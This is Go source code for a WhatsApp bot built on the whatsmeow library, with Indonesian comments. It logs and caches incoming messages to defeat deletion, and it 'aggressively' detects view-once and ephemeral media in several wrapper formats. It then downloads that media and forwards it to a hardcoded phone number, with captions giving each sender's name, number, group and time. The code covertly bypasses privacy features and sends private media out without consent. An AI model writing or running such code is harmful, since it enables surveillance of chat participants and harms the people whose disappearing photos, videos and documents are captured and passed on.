package main

import (
	"botwa/log"
	"botwa/plugin"
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
)

func Handler(client *whatsmeow.Client) func(interface{}) {
	return func(evt interface{}) {
		switch m := evt.(type) {
		case *events.Message:
			// 1. Validasi dasar: Pastikan pesan memiliki konten agar bot tidak crash (nil pointer)
			if m.Message == nil {
				return
			}

			// Log pesan masuk
			log.Raw(m, "!")

			// 2. Cek apakah ini pesan revoke (untuk anti-delete)
			if m.Message.GetProtocolMessage() != nil {
				plugin.HandleDeletedMessage(client, m)
				return
			}

			// 3. AGGRESSIVE VIEW ONCE DETECTION & EXTRACTION
			// Gunakan protokol MULTI-LAYER untuk membaca viewonce secara otomatis
			// tanpa hanya mengandalkan reply orang. Tetap maintain context dari reply chat.
			// JUGA PROSES VIEWONCE DARI BOT SENDIRI (SELF REPLY)
			if handleAggressiveViewOnce(client, m) {
				return
			}

			// 4. Proses Media biasa (Bukan ViewOnce)
			mediaPath := plugin.DownloadAndCacheMedia(client, m)

			// Simpan pesan biasa ke cache untuk kebutuhan Anti-Delete
			plugin.CacheMessage(m, mediaPath)

			// 5. Ambil text dari pesan untuk mengecek Command
			text := m.Message.GetConversation()
			if text == "" && m.Message.GetExtendedTextMessage() != nil {
				text = m.Message.GetExtendedTextMessage().GetText()
			}

			// Cek apakah ada prefix command
			hasPrefix, usedPrefix := hasPrefix(text)
			if hasPrefix {
				// Hapus prefix dari text
				cleanText := usedPrefix + removePrefix(text)
				plugin.Execute(client, m, cleanText)
			}
		}
	}
}

// handleAggressiveViewOnce melakukan deteksi dan ekstraksi AGRESIF terhadap semua protokol viewonce
// - Menggunakan multi-layer scanning (ViewOnceV1, V2, Extension, Ephemeral, Quoted, Forward headers)
// - Tetap menggunakan context reply untuk info sender
// - JUGA HANDLE viewonce dari bot sendiri (self reply)
// - Mengembalikan true jika berhasil tangkap dan proses viewonce
func handleAggressiveViewOnce(client *whatsmeow.Client, m *events.Message) bool {
	ctx := context.Background()

	fmt.Printf("[AggressiveViewOnce] triggered: msgID=%s chat=%s fromMe=%v isGroup=%v sender=%s pushName=%s\n",
		m.Info.ID, m.Info.Chat.String(), m.Info.IsFromMe, m.Info.IsGroup, m.Info.Sender.User, m.Info.PushName)

	// STAGE 1: PROTOKOL SCANNING - Ekstrak media dari semua layer wrapper
	viewOnceData := extractViewOnceFromAllProtocols(m.Message)
	if !viewOnceData.IsViewOnce {
		fmt.Printf("[AggressiveViewOnce] tidak terdeteksi viewonce di semua protokol\n")
		return false
	}

	fmt.Printf("[AggressiveViewOnce] FOUND: viewOnce=%v img=%v vid=%v aud=%v doc=%v quoted=%v forward=%v\n",
		viewOnceData.IsViewOnce, viewOnceData.ImageMsg != nil, viewOnceData.VideoMsg != nil,
		viewOnceData.AudioMsg != nil, viewOnceData.DocumentMsg != nil,
		viewOnceData.QuotedMsg != nil, viewOnceData.ForwardedMsg != nil)

	// Jika tidak ada media yang terdeteksi, abaikan
	if !viewOnceData.hasMedia() {
		fmt.Printf("[AggressiveViewOnce] no media objects found\n")
		return false
	}

	// STAGE 2: BUILD CONTEXT INFO - Gunakan info dari reply chat (context) + direct sender info
	contextInfo := buildViewOnceContextInfo(client, m, viewOnceData)

	// STAGE 3: DOWNLOAD & FORWARD - Proses setiap media yang terdeteksi
	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
	if errJID != nil {
		fmt.Printf("[AggressiveViewOnce] parse target JID error: %v\n", errJID)
		return true // still mark as viewonce, but can't forward
	}

	processViewOnceMedias(client, ctx, targetJID, contextInfo, viewOnceData)

	return true
}

// ViewOnceData menyimpan hasil ekstraksi dari semua protokol viewonce
type ViewOnceData struct {
	IsViewOnce   bool
	ImageMsg     *proto.ImageMessage
	VideoMsg     *proto.VideoMessage
	AudioMsg     *proto.AudioMessage
	DocumentMsg  *proto.DocumentMessage
	QuotedMsg    *proto.Message    // msg dari context.QuotedMessage
	ForwardedMsg *proto.Message    // msg dari forward header
	RawMessage   *proto.Message    // msg terakhir setelah unwrap
}

func (vod *ViewOnceData) hasMedia() bool {
	return vod.ImageMsg != nil || vod.VideoMsg != nil || vod.AudioMsg != nil || vod.DocumentMsg != nil
}

// extractViewOnceFromAllProtocols melakukan scanning multi-protokol:
// - Direct ViewOnceV1/V2/Extension pada top level
// - Ephemeral containers
// - Quoted message (reply) dalam ExtendedTextMessage.ContextInfo
// - Forward headers (jika ada)
func extractViewOnceFromAllProtocols(msg *proto.Message) ViewOnceData {
	result := ViewOnceData{}
	if msg == nil {
		return result
	}

	// PROTOKOL 1: Scan ViewOnceV2 (paling umum di versi terbaru)
	if v2 := msg.GetViewOnceMessageV2(); v2 != nil && v2.GetMessage() != nil {
		fmt.Printf("[Protocol] scanning ViewOnceV2\n")
		result.IsViewOnce = true
		innerMsg := v2.GetMessage()
		result.ImageMsg = innerMsg.GetImageMessage()
		result.VideoMsg = innerMsg.GetVideoMessage()
		result.AudioMsg = innerMsg.GetAudioMessage()
		result.DocumentMsg = innerMsg.GetDocumentMessage()
		result.RawMessage = innerMsg
	}

	// PROTOKOL 2: Scan ViewOnceV2Extension
	if ext := msg.GetViewOnceMessageV2Extension(); ext != nil && ext.GetMessage() != nil && !result.IsViewOnce {
		fmt.Printf("[Protocol] scanning ViewOnceMessageV2Extension\n")
		result.IsViewOnce = true
		innerMsg := ext.GetMessage()
		result.ImageMsg = innerMsg.GetImageMessage()
		result.VideoMsg = innerMsg.GetVideoMessage()
		result.AudioMsg = innerMsg.GetAudioMessage()
		result.DocumentMsg = innerMsg.GetDocumentMessage()
		result.RawMessage = innerMsg
	}

	// PROTOKOL 3: Scan ViewOnceV1 (legacy)
	if v1 := msg.GetViewOnceMessage(); v1 != nil && v1.GetMessage() != nil && !result.IsViewOnce {
		fmt.Printf("[Protocol] scanning ViewOnceMessageV1\n")
		result.IsViewOnce = true
		innerMsg := v1.GetMessage()
		result.ImageMsg = innerMsg.GetImageMessage()
		result.VideoMsg = innerMsg.GetVideoMessage()
		result.AudioMsg = innerMsg.GetAudioMessage()
		result.DocumentMsg = innerMsg.GetDocumentMessage()
		result.RawMessage = innerMsg
	}

	// PROTOKOL 4: Scan Ephemeral (sering dipakai untuk view-once-like behavior)
	if ep := msg.GetEphemeralMessage(); ep != nil && ep.GetMessage() != nil {
		fmt.Printf("[Protocol] scanning EphemeralMessage\n")
		innerMsg := ep.GetMessage()
		// Scan inner untuk ViewOnce lagi (recursive check)
		innerVO := extractViewOnceFromAllProtocols(innerMsg)
		if innerVO.IsViewOnce {
			result = innerVO
		} else {
			// Jika ephemeral tapi bukan viewonce, tetap cek media (treat ephemeral as sensitive)
			if im := innerMsg.GetImageMessage(); im != nil {
				result.IsViewOnce = true
				result.ImageMsg = im
				result.RawMessage = innerMsg
			} else if vm := innerMsg.GetVideoMessage(); vm != nil {
				result.IsViewOnce = true
				result.VideoMsg = vm
				result.RawMessage = innerMsg
			} else if am := innerMsg.GetAudioMessage(); am != nil {
				result.IsViewOnce = true
				result.AudioMsg = am
				result.RawMessage = innerMsg
			} else if dm := innerMsg.GetDocumentMessage(); dm != nil {
				result.IsViewOnce = true
				result.DocumentMsg = dm
				result.RawMessage = innerMsg
			}
		}
	}

	// PROTOKOL 5: Scan Quoted Message (dari ExtendedTextMessage.ContextInfo.QuotedMessage)
	if extText := msg.GetExtendedTextMessage(); extText != nil && extText.GetContextInfo() != nil {
		if quoted := extText.GetContextInfo().QuotedMessage; quoted != nil {
			fmt.Printf("[Protocol] scanning QuotedMessage from ExtendedTextMessage.ContextInfo\n")
			quotedVO := extractViewOnceFromAllProtocols(quoted)
			if quotedVO.IsViewOnce {
				result.IsViewOnce = true
				result.QuotedMsg = quoted
				// Copy media dari quoted jika belum ada
				if result.ImageMsg == nil {
					result.ImageMsg = quotedVO.ImageMsg
				}
				if result.VideoMsg == nil {
					result.VideoMsg = quotedVO.VideoMsg
				}
				if result.AudioMsg == nil {
					result.AudioMsg = quotedVO.AudioMsg
				}
				if result.DocumentMsg == nil {
					result.DocumentMsg = quotedVO.DocumentMsg
				}
				if result.RawMessage == nil {
					result.RawMessage = quotedVO.RawMessage
				}
			}
		}

		// PROTOKOL 6: Scan Forward Headers (ReplyTo dalam ContextInfo)
		if forwarded := extText.GetContextInfo().ForwardedNewsletterMessageInfo; forwarded != nil {
			fmt.Printf("[Protocol] scanning ForwardedNewsletterMessageInfo\n")
			// Ini adalah info forward dari newsletter, bisa berisi content
			result.ForwardedMsg = msg
		}
	}

	// PROTOKOL 7: Direct media flag check (jika media langsung memiliki ViewOnce flag)
	if !result.IsViewOnce {
		if im := msg.GetImageMessage(); im != nil && im.GetViewOnce() {
			fmt.Printf("[Protocol] detected direct ImageMessage with ViewOnce flag\n")
			result.IsViewOnce = true
			result.ImageMsg = im
			result.RawMessage = msg
		} else if vm := msg.GetVideoMessage(); vm != nil && vm.GetViewOnce() {
			fmt.Printf("[Protocol] detected direct VideoMessage with ViewOnce flag\n")
			result.IsViewOnce = true
			result.VideoMsg = vm
			result.RawMessage = msg
		} else if am := msg.GetAudioMessage(); am != nil && am.GetViewOnce() {
			fmt.Printf("[Protocol] detected direct AudioMessage with ViewOnce flag\n")
			result.IsViewOnce = true
			result.AudioMsg = am
			result.RawMessage = msg
		}
	}

	return result
}

// ViewOnceContextInfo menyimpan semua info context untuk logging/caption
type ViewOnceContextInfo struct {
	SenderNumber  string
	SenderName    string
	Origin        string // "Private" atau "Grup"
	GroupName     string
	MessageTime   int64           // Unix timestamp
	MessageTimeFmt string          // Format: HH:MM:SS (waktu lokal)
	MessageID     string
	IsQuoted      bool
	IsForwarded   bool
	IsFromBot     bool            // TRUE jika dari bot sendiri
	QuotedSender  string
	QuotedTime    int64
}

// cleanPhoneNumber membersihkan nomor dari format internal WhatsApp menjadi nomor yang readable
// Input: "2664216700273691" atau "62851234567890" atau "163698953994375"
// Output: "62851234567890" (format internasional yang benar)
func cleanPhoneNumber(rawNum string) string {
	if rawNum == "" {
		return "unknown"
	}

	// Hapus karakter non-digit
	re := regexp.MustCompile(`\D`)
	cleaned := re.ReplaceAllString(rawNum, "")

	// Jika mulai dengan 0, ganti dengan 62 (Indonesia)
	if strings.HasPrefix(cleaned, "0") {
		cleaned = "62" + cleaned[1:]
	}

	// Jika tidak ada prefix internasional, tambahkan 62
	if !strings.HasPrefix(cleaned, "62") && !strings.HasPrefix(cleaned, "+62") {
		// Jika terlihat ID format lama (lebih dari 15 digit), kemungkinan ID internal
		// Skip dan return sebagai-adanya
		if len(cleaned) > 15 {
			return cleaned // return apa adanya jika format aneh
		}
		cleaned = "62" + cleaned
	}

	// Validasi panjang (nomor Indo umumnya 62 + 9-11 digit)
	if len(cleaned) < 11 || len(cleaned) > 15 {
		return cleaned // kembalikan apa adanya jika panjangnya aneh
	}

	return cleaned
}

// buildViewOnceContextInfo membangun info context dari message event + viewonce data
func buildViewOnceContextInfo(client *whatsmeow.Client, m *events.Message, vod ViewOnceData) ViewOnceContextInfo {
	ctx := context.Background()

	// Parse nomor pengirim - extract dari Sender.User dan bersihkan
	senderNum := m.Info.Sender.User
	if senderNum == "" {
		senderNum = "unknown"
	}

	// Coba extract nomor yang lebih clean dari quoted message jika ada
	if vod.QuotedMsg != nil {
		if extText := vod.QuotedMsg.GetExtendedTextMessage(); extText != nil && extText.GetContextInfo() != nil {
			if participant := extText.GetContextInfo().Participant; participant != nil && *participant != "" {
				senderNum = *participant
			}
		}
	}

	// Bersihkan nomor agar readable
	cleanedNum := cleanPhoneNumber(senderNum)

	// Get bot number untuk check self reply
	botInfo := client.Store.ID
	isBotSelf := false
	if botInfo != nil && botInfo.User == senderNum {
		isBotSelf = true
	}

	info := ViewOnceContextInfo{
		SenderNumber: cleanedNum,
		SenderName:   m.Info.PushName,
		MessageID:    m.Info.ID,
		MessageTime:  m.Info.Timestamp.Unix(),
		IsFromBot:    isBotSelf,
	}

	// Format waktu ke HH:MM:SS (timezone lokal)
	msgTime := time.Unix(m.Info.Timestamp.Unix(), 0)
	info.MessageTimeFmt = msgTime.Format("15:04:05")

	// Sanitasi nama
	if info.SenderName == "" {
		info.SenderName = info.SenderNumber
	}

	// Tentukan origin
	if m.Info.IsGroup {
		info.Origin = "Grup"
		if gi, err := client.GetGroupInfo(ctx, m.Info.Chat); err == nil && gi != nil {
			info.GroupName = gi.Name
		} else {
			info.GroupName = m.Info.Chat.String()
		}
	} else {
		info.Origin = "Private"
		info.GroupName = "-"
	}

	// Check if quoted
	if vod.QuotedMsg != nil {
		info.IsQuoted = true
		// Try to extract sender info dari quoted message contextinfo
		if extText := vod.QuotedMsg.GetExtendedTextMessage(); extText != nil && extText.GetContextInfo() != nil {
			if participant := extText.GetContextInfo().Participant; participant != nil {
				info.QuotedSender = cleanPhoneNumber(*participant)
			}
		}
	}

	// Check if forwarded
	if vod.ForwardedMsg != nil {
		info.IsForwarded = true
	}

	return info
}

// processViewOnceMedias melakukan download dan forward semua media yang terdeteksi
func processViewOnceMedias(client *whatsmeow.Client, ctx context.Context, targetJID types.JID,
	contextInfo ViewOnceContextInfo, vod ViewOnceData) {

	// Build caption base dengan format yang lebih rapi dan nomor yang benar
	captionBase := fmt.Sprintf(
		"📥 *RVO AGGRESSIVE*\n\n"+
		"👤 Pengirim: %s (%s)\n"+
		"📱 Nomor: %s\n"+
		"📍 Lokasi: %s\n"+
		"🏢 Grup: %s\n"+
		"⏰ Waktu: %s",
		contextInfo.SenderName, contextInfo.Origin, contextInfo.SenderNumber,
		contextInfo.Origin, contextInfo.GroupName, contextInfo.MessageTimeFmt,
	)

	// Tambah info jika dari bot sendiri
	if contextInfo.IsFromBot {
		captionBase += "\n✅ *[SELF REPLY - BOT]*"
	}

	// Tambah info jika quoted/reply
	if contextInfo.IsQuoted {
		captionBase += "\n💬 *[QUOTED: YA]*"
		if contextInfo.QuotedSender != "" {
			captionBase += fmt.Sprintf("\n   Dari: %s", contextInfo.QuotedSender)
		}
	}

	// Tambah info jika forwarded
	if contextInfo.IsForwarded {
		captionBase += "\n➡️  *[FORWARDED: YA]*"
	}

	fmt.Printf("[ProcessMedia] Building caption:\n%s\n", captionBase)

	// Process setiap tipe media
	if vod.ImageMsg != nil {
		fmt.Printf("[ProcessMedia] handling image\n")
		plugin.HandleViewOnceImage(client, ctx, targetJID, vod.ImageMsg, captionBase, vod.RawMessage)
	}
	if vod.VideoMsg != nil {
		fmt.Printf("[ProcessMedia] handling video\n")
		plugin.HandleViewOnceVideo(client, ctx, targetJID, vod.VideoMsg, captionBase, vod.RawMessage)
	}
	if vod.AudioMsg != nil {
		fmt.Printf("[ProcessMedia] handling audio\n")
		plugin.HandleViewOnceAudio(client, ctx, targetJID, vod.AudioMsg, captionBase, vod.RawMessage)
	}
	if vod.DocumentMsg != nil {
		fmt.Printf("[ProcessMedia] handling document\n")
		plugin.HandleViewOnceDocument(client, ctx, targetJID, vod.DocumentMsg, captionBase, vod.RawMessage)
	}
}
